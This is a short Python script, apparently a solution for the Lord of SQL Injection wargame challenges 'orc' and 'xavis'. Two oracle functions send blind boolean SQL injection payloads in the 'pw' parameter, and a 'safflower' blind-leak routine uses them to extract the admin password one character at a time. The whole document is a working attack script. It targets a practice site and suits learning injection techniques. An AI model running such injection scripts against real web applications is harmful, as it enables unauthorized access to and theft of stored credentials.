#!/usr/bin/env python3
import safflower


def example(i, c):
	import requests
	url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
	params = {
		'pw': """foo' || id = 'admin' && ascii(mid(pw, %d, 1)) > '%d""" % (i + 1, ord(c)),
	}
	cookies = {
		'PHPSESSID': '???',
	}
	res = requests.get(url, params=params, cookies=cookies)
	return '<h2>Hello admin</h2>' in res.text


def example2(i, c):
	import requests
	url = 'https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php'
	params = {
		'pw': """foo' || id = 'admin' && mid(pw, %d, 1) > '%c""" % (i + 1, c),
	}
	cookies = {
		'PHPSESSID': '???',
	}
	res = requests.get(url, params=params, cookies=cookies)
	return '<h2>Hello admin</h2>' in res.text


blind = safflower.blind()
res = blind.leak(
	compare_function = example,
	max_length = 100,
	letter_table = blind.MULTI_BYTES,
	use_logging = True,
	use_asynchronous = True,
)

print()
try:
	import hexdump
	hexdump.hexdump(res.encode())
except:
	print(res)